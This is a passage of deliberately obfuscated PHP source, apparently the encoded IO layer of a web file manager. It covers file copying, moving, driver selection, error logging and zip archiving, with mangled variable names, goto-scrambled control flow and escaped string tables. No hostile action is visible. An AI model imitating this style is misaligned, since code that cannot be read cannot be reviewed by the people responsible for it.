$Cî¨¡…ÙŸ, $AÅŸÄ‚¬à); } } goto dæ­ƒ·‘¼; f²ŒÃ¥¡©: if ($D…ÂŸ©†Í) { $E è•¾¯÷© = $D…ÂŸ©†Í->getPathOuter($E è•¾¯÷©); } return $E è•¾¯÷©; goto bë·¤„Ç™¸; bë·¤„Ç™¸: } private static function check($fÏ„öì , $d÷£‰É«Ğ…, $B´«ïÏ‚„, &$a“ÊÏ„®¡í) { $e£‰µ¸’õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (self::driverIsSame($fÏ„öì , $B´«ïÏ‚„) && $fÏ„öì ->isFolder($d÷£‰É«Ğ…) && $fÏ„öì ->isParentOf($d÷£‰É«Ğ…, $a“ÊÏ„®¡í)) { show_json(LNG($e£‰µ¸’õ[1010]), !1); } if (!$fÏ„öì ->exist($d÷£‰É«Ğ…)) { show_json(LNG($e£‰µ¸’õ[114]), !1); } } private static function copyPath($FÇÇ ½ß†, $d¼œä‡Ö‡, $a­°¿“çÔë, $D«èµ‡ÆÊƒ, $EšëÃ‡ÚŠÈ, $fÂ¥¹¤Ãá½, $b¯Ë±Ÿò, $A®ôŸ°Ë… = false) { goto e·êÔîçâ§; FÓ„ —¦: return $a¬Â´õ‰È; goto dâŸêİ”¥; bµí¡ø§¸: if ($b¯Ë±Ÿò) { return self::copyFile($FÇÇ ½ß†, $d¼œä‡Ö‡, $a­°¿“çÔë, $D«èµ‡ÆÊƒ, $B©—ß¶†ò­, $fÂ¥¹¤Ãá½); } if ($EšëÃ‡ÚŠÈ == REPEAT_RENAME_FOLDER) { $EšëÃ‡ÚŠÈ = !1; } $c´’“½ã‰ò = rtrim($D«èµ‡ÆÊƒ, $cÂ²’¡†Óì[8]) . $cÂ²’¡†Óì[8] . $B©—ß¶†ò­; goto A™åÌò; A™åÌò: $a¬Â´õ‰È = $a­°¿“çÔë->mkdir($a­°¿“çÔë->getPath($c´’“½ã‰ò)); $D«èµ‡ÆÊƒ = $a­°¿“çÔë->getPathInner($a¬Â´õ‰È); $cÓî›îË¥Ş = $FÇÇ ½ß†->listPath($d¼œä‡Ö‡, !0); goto a‰ÃÑ£ï—Ü; a‰ÃÑ£ï—Ü: $cÓî›îË¥Ş = is_array($cÓî›îË¥Ş) ? $cÓî›îË¥Ş : array($cÂ²’¡†Óì[83] => array(), $cÂ²’¡†Óì[84] => array()); $f¡éƒêÇöª = array_merge($cÓî›îË¥Ş[$cÂ²’¡†Óì[83]], $cÓî›îË¥Ş[$cÂ²’¡†Óì[84]]); foreach ($f¡éƒêÇöª as $aƒ‹ºÍ³îã) { $a´ÎïŞÌ‚Û = $aƒ‹ºÍ³îã[$cÂ²’¡†Óì[29]] == $cÂ²’¡†Óì[201]; $d¼œä‡Ö‡ = $FÇÇ ½ß†->getPathInner($aƒ‹ºÍ³îã[$cÂ²’¡†Óì[85]]); $dÍ„†¢Ü† = self::copyPath($FÇÇ ½ß†, $d¼œä‡Ö‡, $a­°¿“çÔë, $D«èµ‡ÆÊƒ, $EšëÃ‡ÚŠÈ, $fÂ¥¹¤Ãá½, $a´ÎïŞÌ‚Û); if (!$dÍ„†¢Ü†) { IO::errorTips($cÂ²’¡†Óì[1011] . $d¼œä‡Ö‡ . $cÂ²’¡†Óì[76] . $D«èµ‡ÆÊƒ); } } goto FÓ„ —¦; e·êÔîçâ§: $cÂ²’¡†Óì =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B©—ß¶†ò­ = $A®ôŸ°Ë… ? $A®ôŸ°Ë… : $FÇÇ ½ß†->pathThis($d¼œä‡Ö‡); if ($EšëÃ‡ÚŠÈ) { $C…˜³‘§Ê = $a­°¿“çÔë->fileNameExist($D«èµ‡ÆÊƒ, $B©—ß¶†ò­); $B©—ß¶†ò­ = $a­°¿“çÔë->fileNameAuto($D«èµ‡ÆÊƒ, $B©—ß¶†ò­, $EšëÃ‡ÚŠÈ, !$b¯Ë±Ÿò); $EšëÃ‡ÚŠÈ = $C…˜³‘§Ê ? $EšëÃ‡ÚŠÈ : !1; } goto bµí¡ø§¸; dâŸêİ”¥: } private static function copyFile($d’­™¶ßÄƒ, $BŸÌ±âº¶™, $AƒÉƒ„¶ ‰, $aÙöŠ¨Æ„ê, $b‚½àô×, $f™Ã¯‹Ÿ„) { goto e²íÜÒ„ÑÀ; e²íÜÒ„ÑÀ: $D–ÔÀ”Šá¬ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aÙöŠ¨Æ„ê = $AƒÉƒ„¶ ‰->getPath(rtrim($aÙöŠ¨Æ„ê, $D–ÔÀ”Šá¬[8]) . $D–ÔÀ”Šá¬[8] . $b‚½àô×); $aÑ³Úö¹ = $D–ÔÀ”Šá¬[1012] . time() . rand_string(5); goto Cø¤¶›ä‰‡; b’Ö”ÂÕç: $Bö•Á¬‹ó = $d’­™¶ßÄƒ->iconvApp($Bö•Á¬‹ó); $BœŒ¶¿Æßˆ = $AƒÉƒ„¶ ‰->upload($aÙöŠ¨Æ„ê, $Bö•Á¬‹ó, $f™Ã¯‹Ÿ„); self::remove($CØò³êæÑ‡ . $aÑ³Úö¹); goto a®¼³²æö; a®¼³²æö: Hook::trigger($D–ÔÀ”Šá¬[1014], $d’­™¶ßÄƒ, $BŸÌ±âº¶™, $AƒÉƒ„¶ ‰, $aÙöŠ¨Æ„ê, $b‚½àô×, $BœŒ¶¿Æßˆ); return $BœŒ¶¿Æßˆ; goto c˜Çâ¹ƒ§“; A¹÷Å´ƒĞ¸: mk_dir($CØò³êæÑ‡); $Bö•Á¬‹ó = $CØò³êæÑ‡ . $aÑ³Úö¹; $Bö•Á¬‹ó = $d’­™¶ßÄƒ->download($BŸÌ±âº¶™, $Bö•Á¬‹ó); goto b’Ö”ÂÕç; Cø¤¶›ä‰‡: Hook::trigger($D–ÔÀ”Šá¬[1013], $d’­™¶ßÄƒ, $BŸÌ±âº¶™, $AƒÉƒ„¶ ‰, $aÙöŠ¨Æ„ê, $b‚½àô×, $aÑ³Úö¹); if (self::driverIsSame($d’­™¶ßÄƒ, $AƒÉƒ„¶ ‰)) { if ($f™Ã¯‹Ÿ„) { $BœŒ¶¿Æßˆ = $AƒÉƒ„¶ ‰->moveFile($BŸÌ±âº¶™, $aÙöŠ¨Æ„ê); } else { $BœŒ¶¿Æßˆ = $AƒÉƒ„¶ ‰->copyFile($BŸÌ±âº¶™, $aÙöŠ¨Æ„ê); } Hook::trigger($D–ÔÀ”Šá¬[1014], $d’­™¶ßÄƒ, $BŸÌ±âº¶™, $AƒÉƒ„¶ ‰, $aÙöŠ¨Æ„ê, $b‚½àô×, $BœŒ¶¿Æßˆ); return $BœŒ¶¿Æßˆ; } $CØò³êæÑ‡ = TEMP_FILES; goto A¹÷Å´ƒĞ¸; c˜Çâ¹ƒ§“: } public static function pathFather($BØÚÜøîº) { $Fë¹Ğñ®ˆ = IO::init($BØÚÜøîº); $EÄƒÒìª¢” = $Fë¹Ğñ®ˆ->pathFather($Fë¹Ğñ®ˆ->path); return $Fë¹Ğñ®ˆ->getPathOuter($EÄƒÒìª¢”); } public static function fileOut($A±ß£İƒ…, $CËËÛŞ¥‹£ = false, $dë™ó…ªŸó = false, $EË¤ÙæÎî = '') { $E¿¥ö‰Ä¨õ = self::driverMake($A±ß£İƒ…); if ($E¿¥ö‰Ä¨õ->isFileOutServer()) { return $E¿¥ö‰Ä¨õ->fileOutServer($A±ß£İƒ…, $CËËÛŞ¥‹£, $dë™ó…ªŸó, $EË¤ÙæÎî); } return $E¿¥ö‰Ä¨õ->fileOut($A±ß£İƒ…, $CËËÛŞ¥‹£, $dë™ó…ªŸó, $EË¤ÙæÎî); } public static function fileOutImage($D’ÉÏù‰Å, $AÀá‚‚ÈÙŒ = 250) { $FİÊ©¼‚ö = array(250, 600, 1200, 3000, 5000); for ($d­ÜÖË§ÈÁ = 0; $d­ÜÖË§ÈÁ < count($FİÊ©¼‚ö); $d­ÜÖË§ÈÁ++) { if ($d­ÜÖË§ÈÁ == 0 && $AÀá‚‚ÈÙŒ <= $FİÊ©¼‚ö[$d­ÜÖË§ÈÁ]) { $AÀá‚‚ÈÙŒ = $FİÊ©¼‚ö[$d­ÜÖË§ÈÁ]; break; } else { if ($AÀá‚‚ÈÙŒ > $FİÊ©¼‚ö[$d­ÜÖË§ÈÁ - 1] && $AÀá‚‚ÈÙŒ <= $FİÊ©¼‚ö[$d­ÜÖË§ÈÁ]) { $AÀá‚‚ÈÙŒ = $FİÊ©¼‚ö[$d­ÜÖË§ÈÁ]; break; } else { if ($d­ÜÖË§ÈÁ == count($FİÊ©¼‚ö) - 1 && $AÀá‚‚ÈÙŒ > $FİÊ©¼‚ö[$d­ÜÖË§ÈÁ]) { $AÀá‚‚ÈÙŒ = $FİÊ©¼‚ö[$d­ÜÖË§ÈÁ]; break; } } } } $fÇ¾»—ìÎ— = self::driverMake($D’ÉÏù‰Å); if ($fÇ¾»—ìÎ—->isFileOutServer()) { return $fÇ¾»—ìÎ—->fileOutImageServer($D’ÉÏù‰Å, $AÀá‚‚ÈÙŒ); } return $fÇ¾»—ìÎ—->fileOutImage($D’ÉÏù‰Å, $AÀá‚‚ÈÙŒ); } private static function driverIsSame($cœô›®ê—â, $dÊÕèœ›‹Ü) { goto F˜Ì¤Â’¡; DèĞ¾ğÆ²: if ($Bá¸•……í != $A¡¸Æºæ™—) { return !1; } if ($Bá¸•……í == $B¦ªÄóÆ„á[699]) { return !0; } if ($Bá¸•……í == $B¦ªÄóÆ„á[115]) { return !0; } goto a•æ¾ÈŒÚ; F˜Ì¤Â’¡: $B¦ªÄóÆ„á =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Bá¸•……í = $cœô›®ê—â->getType(); $A¡¸Æºæ™— = $dÊÕèœ›‹Ü->getType(); goto DèĞ¾ğÆ²; a•æ¾ÈŒÚ: if ($cœô›®ê—â->pathDriver == $dÊÕèœ›‹Ü->pathDriver) { return !0; } return !1; goto bˆ„—ë „ƒ; bˆ„—ë „ƒ: } public static function copyUpdate($B¦óê¡ç´Ï, $a…à­–æÛ†) { goto D·Ö†…”Ôˆ; D·Ö†…”Ôˆ: $e®˜ßØŒ® =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!IO::exist($B¦óê¡ç´Ï)) { return !1; } if (!IO::exist($a…à­–æÛ†)) { IO::mkdir($a…à­–æÛ†); } goto aÑª”©Ãè ; aÑª”©Ãè : $F…ÔˆËÎéê = self::_listAll($B¦óê¡ç´Ï); $BÎÙ¥ã = self::_listAll($a…à­–æÛ†); $Fâæàå»’ = array(); goto b‘î„ã–Ã§; b‘î„ã–Ã§: $b¿ŠÑÒù = array(); foreach ($F…ÔˆËÎéê as $DÛÃ¥ÍÓÏ => $BÄ½Òƒ¬ÕÔ) { if (isset($BÎÙ¥ã[$DÛÃ¥ÍÓÏ])) { if ($BÄ½Òƒ¬ÕÔ[$e®˜ßØŒ®[86]] == 1) { continue; } if ($BÎÙ¥ã[$DÛÃ¥ÍÓÏ][$e®˜ßØŒ®[87]] == $BÄ½Òƒ¬ÕÔ[$e®˜ßØŒ®[87]]) { continue; } } if ($BÄ½Òƒ¬ÕÔ[$e®˜ßØŒ®[86]] == 1) { $b¿ŠÑÒù[] = $a…à­–æÛ† . $e®˜ßØŒ®[8] . $DÛÃ¥ÍÓÏ; continue; } $dÕ«ãÆ±° = strstr(trim($DÛÃ¥ÍÓÏ, $e®˜ßØŒ®[8]), $e®˜ßØŒ®[8]) ? get_path_father($DÛÃ¥ÍÓÏ) : $e®˜ßØŒ®[33]; $Fâæàå»’[] = array($e®˜ßØŒ®[1015] => $BÄ½Òƒ¬ÕÔ[$e®˜ßØŒ®[85]], $e®˜ßØŒ®[1016] => rtrim($a…à­–æÛ†, $e®˜ßØŒ®[8]) . $e®˜ßØŒ®[8] . $dÕ«ãÆ±°, $e®˜ßØŒ®[1017] => $BÄ½Òƒ¬ÕÔ); } $C“Òáó‹Í¬ = array($e®˜ßØŒ®[201] => $Fâæàå»’, $e®˜ßØŒ®[86] => $b¿ŠÑÒù); goto eÀé›ŠÃï„; eÀé›ŠÃï„: Hook::trigger($e®˜ßØŒ®[1018], $B¦óê¡ç´Ï, $a…à­–æÛ†, $C“Òáó‹Í¬); foreach ($b¿ŠÑÒù as $BÄ½Òƒ¬ÕÔ) { IO::mkdir($BÄ½Òƒ¬ÕÔ); } foreach ($Fâæàå»’ as $BÄ½Òƒ¬ÕÔ) { IO::copy($BÄ½Òƒ¬ÕÔ[$e®˜ßØŒ®[1015]], $BÄ½Òƒ¬ÕÔ[$e®˜ßØŒ®[1016]], REPEAT_REPLACE); } goto DÊ—ï¥‹Û; DÊ—ï¥‹Û: } private static function _listAll($e¼´®Õ…ÖÒ) { $AÃ¸Í±¶ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e¼´®Õ…ÖÒ = KodIO::clear($e¼´®Õ…ÖÒ); $CÈ½ÕØå…‡ = IO::listAll($e¼´®Õ…ÖÒ); foreach ($CÈ½ÕØå…‡ as &$a“‡Ñ¡¶×ë) { $CÍó„Ü™Œ· = substr($a“‡Ñ¡¶×ë[$AÃ¸Í±¶[85]], strlen($e¼´®Õ…ÖÒ)); $a“‡Ñ¡¶×ë[$AÃ¸Í±¶[1019]] = trim($CÍó„Ü™Œ·, $AÃ¸Í±¶[8]); } unset($a“‡Ñ¡¶×ë); return array_to_keyvalue($CÈ½ÕØå…‡, $AÃ¸Í±¶[1019]); } public static function fileSubstr($C¥³Ş„Ü³Ï, $Aº™²ÆÃÚŠ, $CÆ©áªäæù = false) { goto a‰Ø™ñˆ¡; eÑŠËØ‚Ù„: $dŸŒ»ùÌÙˆ = $Aº™²ÆÃÚŠ; $AÍäï ÇÌÂ = $CÆ©áªäæù; if ($Aº™²ÆÃÚŠ < 0) { $Aº™²ÆÃÚŠ = $fØ–ÀòŠ’ + $Aº™²ÆÃÚŠ; } goto aõŸ–á¾Ø; aõŸ–á¾Ø: if ($CÆ©áªäæù === !1) { $CÆ©áªäæù = $fØ–ÀòŠ’ - $Aº™²ÆÃÚŠ; } if ($Aº™²ÆÃÚŠ + $CÆ©áªäæù > $fØ–ÀòŠ’) { $CÆ©áªäæù = $fØ–ÀòŠ’ - $Aº™²ÆÃÚŠ; } if (!$fØ–ÀòŠ’ && $FšéÍ½Ï÷->getType() == $BÍ¾µ­ˆëô[115] && !$FšéÍ½Ï÷->exist($C¥³Ş„Ü³Ï)) { throw new Exception($BÍ¾µ­ˆëô[1020] . LNG($BÍ¾µ­ˆëô[1021]) . $BÍ¾µ­ˆëô[885] . get_path_this($C¥³Ş„Ü³Ï) . $BÍ¾µ­ˆëô[33]); } goto E®”àï¼åµ; a‰Ø™ñˆ¡: $BÍ¾µ­ˆëô =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FšéÍ½Ï÷ = self::driverMake($C¥³Ş„Ü³Ï); $fØ–ÀòŠ’ = $FšéÍ½Ï÷->size($C¥³Ş„Ü³Ï); goto eÑŠËØ‚Ù„; E®”àï¼åµ: if ($CÆ©áªäæù <= 0) { return $BÍ¾µ­ˆëô[33]; } if ($Aº™²ÆÃÚŠ < 0 || $Aº™²ÆÃÚŠ >= $fØ–ÀòŠ’ || $CÆ©áªäæù > 1024 * 1024 * 5) { throw new Exception("\146\x69\154\x65\x52\145\141\x64\40\145\162\x72\157\162\41\40\163\x74\141\162\x74\x3d{$Aº™²ÆÃÚŠ}\73\154\145\156\x67\x74\x68\75{$CÆ©áªäæù}\73\x20\163\x69\172\145\75{$fØ–ÀòŠ’}\73"); } $D”°Ñ¼÷à = $FšéÍ½Ï÷->fileSubstr($C¥³Ş„Ü³Ï, $Aº™²ÆÃÚŠ, $CÆ©áªäæù); goto d»éÊ‘ñ‡¿; d»éÊ‘ñ‡¿: if (!$D”°Ñ¼÷à && $CÆ©áªäæù && isset($GLOBALS[$BÍ¾µ­ˆëô[1022]])) { throw new Exception($GLOBALS[$BÍ¾µ­ˆëô[1022]][$BÍ¾µ­ˆëô[1023]]); } return $D”°Ñ¼÷à; goto FŠº“‰”„­; FŠº“‰”„­: } private static function driverMake(&$AÅ—»¡çÉÌ) { goto AÑê ½šİ; dã¬«‚›á‚: return $Eõù‡Ê³š; goto dš™‡‘²ªÑ; AÑê ½šİ: $DÉ½¿›½‰ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A•ŸËº¨ãŒ = KodIO::parse($AÅ—»¡çÉÌ); if (!self::$driverListSystem) { $B¦ß¨¶‚Ã = Model($DÉ½¿›½‰[708])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($B¦ß¨¶‚Ã, $DÉ½¿›½‰[397]); } goto b¹Ÿê ¨Ø–; b¹Ÿê ¨Ø–: if ($A•ŸËº¨ãŒ[$DÉ½¿›½‰[29]] == KodIO::KOD_IO && !self::$driverListSystem[$A•ŸËº¨ãŒ[$DÉ½¿›½‰[397]]]) { return !1; } $AÅ—»¡çÉÌ = $A•ŸËº¨ãŒ[$DÉ½¿›½‰[1024]]; $Eõù‡Ê³š = self::driverGet($A•ŸËº¨ãŒ, $AÅ—»¡çÉÌ); goto dã¬«‚›á‚; dš™‡‘²ªÑ: } private static function driverGet($bïĞóŠÀò, &$d£‡Ã†¼Å¹) { goto f’Ò³Ûì’Ş; aŒÀ¯¤•Œ£: if (isset($F´â‹ÏÚ“É[$cä¥›ê–Á¡[6]][$cä¥›ê–Á¡[1036]])) { $Bß†¯íÕ»¯->pathBase = rtrim($F´â‹ÏÚ“É[$cä¥›ê–Á¡[6]][$cä¥›ê–Á¡[1036]], $cä¥›ê–Á¡[8]) . $cä¥›ê–Á¡[8]; $d£‡Ã†¼Å¹ = $Bß†¯íÕ»¯->pathBase . ltrim($d£‡Ã†¼Å¹, $cä¥›ê–Á¡[8]); } $d£‡Ã†¼Å¹ = $Bß†¯íÕ»¯->getPath($d£‡Ã†¼Å¹); if (isset($bïĞóŠÀò[$cä¥›ê–Á¡[1008]])) { $d£‡Ã†¼Å¹ = $bïĞóŠÀò[$cä¥›ê–Á¡[1008]]; } goto A´¸ÁÎ»Óã; f’Ò³Ûì’Ş: $cä¥›ê–Á¡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AÌÛª´ïğ = $bïĞóŠÀò[$cä¥›ê–Á¡[1025]]; $aï×ƒÉ¿ÕÁ = $bïĞóŠÀò[$cä¥›ê–Á¡[397]]; goto eøÅ×îâ; A´¸ÁÎ»Óã: $Bß†¯íÕ»¯->path = $d£‡Ã†¼Å¹; return $Bß†¯íÕ»¯; goto FÏèÃÏƒ¾İ; eøÅ×îâ: switch ($bïĞóŠÀò[$cä¥›ê–Á¡[29]]) { case KodIO::KOD_IO: $F´â‹ÏÚ“É = self::$driverListSystem[$aï×ƒÉ¿ÕÁ]; break; case KodIO::KOD_SOURCE: $d£‡Ã†¼Å¹ = $aï×ƒÉ¿ÕÁ . $d£‡Ã†¼Å¹; $F´â‹ÏÚ“É = array($cä¥›ê–Á¡[1026] => $cä¥›ê–Á¡[1027], $cä¥›ê–Á¡[6] => $bïĞóŠÀò); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $FˆÍ§ ì°Ä = $GLOBALS[$cä¥›ê–Á¡[1028]]; self::$driverListUser = array_to_keyvalue($FˆÍ§ ì°Ä, $cä¥›ê–Á¡[397]); } $F´â‹ÏÚ“É = self::$driverListUser[$aï×ƒÉ¿ÕÁ]; break; case KodIO::KOD_SHARE_LINK: $F´â‹ÏÚ“É = array($cä¥›ê–Á¡[1026] => $cä¥›ê–Á¡[1029], $cä¥›ê–Á¡[6] => $bïĞóŠÀò); $E­ĞË÷®Ë = Action($cä¥›ê–Á¡[1030])->sharePathInfo($bïĞóŠÀò[$cä¥›ê–Á¡[85]]); $d£‡Ã†¼Å¹ = $E­ĞË÷®Ë[$cä¥›ê–Á¡[399]]; if (!$E­ĞË÷®Ë[$cä¥›ê–Á¡[399]]) { $e©­´É¥½ = Model($cä¥›ê–Á¡[567])->getInfo($E­ĞË÷®Ë[$cä¥›ê–Á¡[471]]); $d£‡Ã†¼Å¹ = KodIO::clear($e©­´É¥½[$cä¥›ê–Á¡[1031]] . $bïĞóŠÀò[$cä¥›ê–Á¡[1024]]); $bïĞóŠÀò[$cä¥›ê–Á¡[469]] = $e©­´É¥½; $bïĞóŠÀò[$cä¥›ê–Á¡[1008]] = $d£‡Ã†¼Å¹; $F´â‹ÏÚ“É = array($cä¥›ê–Á¡[1026] => $cä¥›ê–Á¡[1032], $cä¥›ê–Á¡[6] => $bïĞóŠÀò); } break; case KodIO::KOD_SHARE_ITEM: $F´â‹ÏÚ“É = array($cä¥›ê–Á¡[1026] => $cä¥›ê–Á¡[1033], $cä¥›ê–Á¡[6] => $bïĞóŠÀò); $e©­´É¥½ = Model($cä¥›ê–Á¡[567])->getInfo($bïĞóŠÀò[$cä¥›ê–Á¡[397]]); if ($e©­´É¥½[$cä¥›ê–Á¡[399]] == $cä¥›ê–Á¡[500]) { $d£‡Ã†¼Å¹ = KodIO::clear($e©­´É¥½[$cä¥›ê–Á¡[1031]] . $bïĞóŠÀò[$cä¥›ê–Á¡[1024]]); $bïĞóŠÀò[$cä¥›ê–Á¡[469]] = $e©­´É¥½; $bïĞóŠÀò[$cä¥›ê–Á¡[1008]] = $d£‡Ã†¼Å¹; $F´â‹ÏÚ“É = array($cä¥›ê–Á¡[1026] => $cä¥›ê–Á¡[1034], $cä¥›ê–Á¡[6] => $bïĞóŠÀò); } else { if (!$d£‡Ã†¼Å¹) { $d£‡Ã†¼Å¹ = $e©­´É¥½[$cä¥›ê–Á¡[399]]; } } break; default: $d£‡Ã†¼Å¹ = $bïĞóŠÀò[$cä¥›ê–Á¡[85]]; $F´â‹ÏÚ“É = array($cä¥›ê–Á¡[1026] => $cä¥›ê–Á¡[1035]); break; } $cª‘šùĞ‚ = $bïĞóŠÀò[$cä¥›ê–Á¡[85]]; if (!isset(self::$driverCache[$cª‘šùĞ‚])) { $bóäŒ‹æ¢Ì = strtolower($F´â‹ÏÚ“É[$cä¥›ê–Á¡[103]]); $FÈ·Ü‘ïÖà = $GLOBALS[$cä¥›ê–Á¡[6]][$cä¥›ê–Á¡[97]][$cä¥›ê–Á¡[760]]; $Cã»—½À’³ = $cä¥›ê–Á¡[81] . (isset($FÈ·Ü‘ïÖà[$bóäŒ‹æ¢Ì]) ? $FÈ·Ü‘ïÖà[$bóäŒ‹æ¢Ì] : ucfirst($bóäŒ‹æ¢Ì)); if (!class_exists($Cã»—½À’³)) { show_json("{$Cã»—½À’³}\x20\x6e\157\164\40\145\170\151\163\x74\163\x21", !1); } $Eá×Ø¡ù† = isset($F´â‹ÏÚ“É[$cä¥›ê–Á¡[6]]) ? $F´â‹ÏÚ“É[$cä¥›ê–Á¡[6]] : !1; self::$driverCache[$cª‘šùĞ‚] = new $Cã»—½À’³($Eá×Ø¡ù†); } goto bôÁôº›ä­; bôÁôº›ä­: $Bß†¯íÕ»¯ = self::$driverCache[$cª‘šùĞ‚]; $Bß†¯íÕ»¯->pathDriver = $AÌÛª´ïğ; $Bß†¯íÕ»¯->pathBase = $cä¥›ê–Á¡[33]; goto aŒÀ¯¤•Œ£; FÏèÃÏƒ¾İ: } public static function errorTips($D¹Ô™Î¡ = false) { goto aÜ²¨¼§‰‚; FîÍ‹ƒ´¥ó: $F›ô©£ ½[] = $D¹Ô™Î¡; write_log($EäŠƒ™è¯ô[169] . ACTION . $EäŠƒ™è¯ô[1037] . $D¹Ô™Î¡, $EäŠƒ™è¯ô[1038]); goto aÍÏµ˜«“â; aÜ²¨¼§‰‚: $EäŠƒ™è¯ô =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $F›ô©£ ½ = array(); $F¥êˆ½‘Ä = 1000; goto C¨ˆÉ¶œ¬Ú; C¨ˆÉ¶œ¬Ú: if ($D¹Ô™Î¡ === -1) { return $F›ô©£ ½ ? $F›ô©£ ½[count($F›ô©£ ½) - 1] : $EäŠƒ™è¯ô[33]; } if ($D¹Ô™Î¡ === !1) { return implode($EäŠƒ™è¯ô[63], $F›ô©£ ½); } if (count($F›ô©£ ½) >= $F¥êˆ½‘Ä) { $F›ô©£ ½ = array_slice($F›ô©£ ½, $F¥êˆ½‘Ä * 0.5, $F¥êˆ½‘Ä); } goto FîÍ‹ƒ´¥ó; aÍÏµ˜«“â: } public static function getLastError($E ¼ÆäÜİ¦ = '') { $D…ñøëø¥£ = self::errorTips(-1); return $D…ñøëø¥£ ? $D…ñøëø¥£ : $E ¼ÆäÜİ¦; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $FºñÅã¨´; if (!$FºñÅã¨´) { $eÌÔºã‘ = IO::init($_SERVER[í¤âËÚ£¶íÊ¢][8]); } return $eÌÔºã‘; } private static function iconvSystem($bµÈº´óÆó) { return self::local()->iconvSystem($bµÈº´óÆó); } private static function iconvApp($D‰…¢ĞÑàÖ) { return self::local()->iconvApp($D‰…¢ĞÑàÖ); } public static function zip($fÑ œ†²µ, $DÅŠ†ÃËã‡ = "\x7a\x69\160", $B¤¥Æó¦Ú = '', $BŠ¢£ÈËí† = REPEAT_RENAME) { goto CÜÒ¶ÖÄ’‚; BÒ«¾’šÄ½: $f¹è‡ªÌ³… = $F×³¼„®®Š . $bø”†Ş¿†± . $c¶œïÊ¾ˆ[104] . $DÅŠ†ÃËã‡; $f¹è‡ªÌ³… = get_filename_auto($f¹è‡ªÌ³…, $c¶œïÊ¾ˆ[33], $BŠ¢£ÈËí†); $bçÒÙØ™—ã = self::iconvSystem($f¹è‡ªÌ³…); goto EŠÜ¹°¦…¾; A›ÕÏã‡±ç: if (!$D¥ªš¯Ÿ¡­) { del_dir($aŒÈÄÅÁÁº); show_json(LNG($c¶œïÊ¾ˆ[1041]), !1); } del_dir($aŒÈÄÅÁÁº); return $D¥ªš¯Ÿ¡­; goto c¨‹¨ÙÖÙ; Dã“Ø®£·Ú: if ($B¤¥Æó¦Ú || !$aŒÈÄÅÁÁº) { if ($aŒÈÄÅÁÁº && strstr($aŒÈÄÅÁÁº, TEMP_FILES)) { $eËÍ¹¥¤Ò» = $Fà¤ÓÔŒ²Å = array(); recursion_dir($F×³¼„®®Š, $eËÍ¹¥¤Ò», $Fà¤ÓÔŒ²Å, 0); foreach ($eËÍ¹¥¤Ò» as $CÎœä‚ğóî) { del_dir($CÎœä‚ğóî); } foreach ($Fà¤ÓÔŒ²Å as $Bó¹ÃÔÚ ±) { if ($Bó¹ÃÔÚ ± == $bçÒÙØ™—ã) { continue; } del_file($Bó¹ÃÔÚ ±); } } return $f¹è‡ªÌ³…; } $cƒÍ‹³æç = self::pathFather($c‘ÊñŞÊ—Ø[$c¶œïÊ¾ˆ[85]]); $D¥ªš¯Ÿ¡­ = self::move($f¹è‡ªÌ³…, $cƒÍ‹³æç, $BŠ¢£ÈËí†); goto A›ÕÏã‡±ç; FŠœ¨„Òß: $aŒÈÄÅÁÁº = !1; if (!$B¤¥Æó¦Ú && $E´Åæ™¬á->getType() == $c¶œïÊ¾ˆ[115]) { $Fà¤ÓÔŒ²Å = self::zipFileList($fÑ œ†²µ); } else { $aŒÈÄÅÁÁº = $B¤¥Æó¦Ú ? $B¤¥Æó¦Ú : TEMP_FILES . $c¶œïÊ¾ˆ[1039] . time() . rand_string(8) . $c¶œïÊ¾ˆ[8]; mk_dir($aŒÈÄÅÁÁº); $Fà¤ÓÔŒ²Å = self::zipFileList($fÑ œ†²µ, $aŒÈÄÅÁÁº); } $bø”†Ş¿†± = $c‘ÊñŞÊ—Ø[$c¶œïÊ¾ˆ[28]]; goto aí«÷¡¨³©; EŠÜ¹°¦…¾: foreach ($Fà¤ÓÔŒ²Å as $BÃÌŒñõ±À => $aİŸ­ÊáŒ) { $Fà¤ÓÔŒ²Å[$BÃÌŒñõ±À] = self::iconvSystem($aİŸ­ÊáŒ); } KodArchive::create($bçÒÙØ™—ã, $Fà¤ÓÔŒ²Å); if (!IO::exist($f¹è‡ªÌ³…)) { if ($aŒÈÄÅÁÁº) { del_dir($aŒÈÄÅÁÁº); } show_json(LNG($c¶œïÊ¾ˆ[1041]), !1); } goto Dã“Ø®£·Ú; aí«÷¡¨³©: if (count($Fà¤ÓÔŒ²Å) > 1) { $cÙŠÜ…ˆ = IO::info(IO::pathFather($c‘ÊñŞÊ—Ø[$c¶œïÊ¾ˆ[85]])); $bø”†Ş¿†± = $cÙŠÜ…ˆ[$c¶œïÊ¾ˆ[28]]; } $F×³¼„®®Š = $aŒÈÄÅÁÁº; if (!$F×³¼„®®Š) { $F×³¼„®®Š = get_path_father($c‘ÊñŞÊ—Ø[$c¶œïÊ¾ˆ[85]]); if (!$B¤¥Æó¦Ú && $E´Åæ™¬á->getType() == $c¶œïÊ¾ˆ[115]) { $F×³¼„®®Š = get_path_father($E´Åæ™¬á->path); } $e†™œóË¾¸ = IO::info($F×³¼„®®Š); if (!$e†™œóË¾¸[$c¶œïÊ¾ˆ[204]]) { show_json(LNG($c¶œïÊ¾ˆ[1040]), !1); } } goto BÒ«¾’šÄ½; CÜÒ¶ÖÄ’‚: $c¶œïÊ¾ˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E´Åæ™¬á = self::init($fÑ œ†²µ[0][$c¶œïÊ¾ˆ[85]]); $c‘ÊñŞÊ—Ø = self::info($fÑ œ†²µ[0][$c¶œïÊ¾ˆ[85]]); goto FŠœ¨„Òß; c¨‹¨ÙÖÙ: } public static function unzip($aÂÂŒˆŞÈÚ, $aë¿ÚÕêä = "\162\145\x70\x6c\x61\x63\x65") { goto D‚¼±Ñì¬; e××õ¸†ŸĞ: if (!@file_exists(self::iconvSystem($AÇî éøğ))) { $dìÚš˜Ïìˆ = 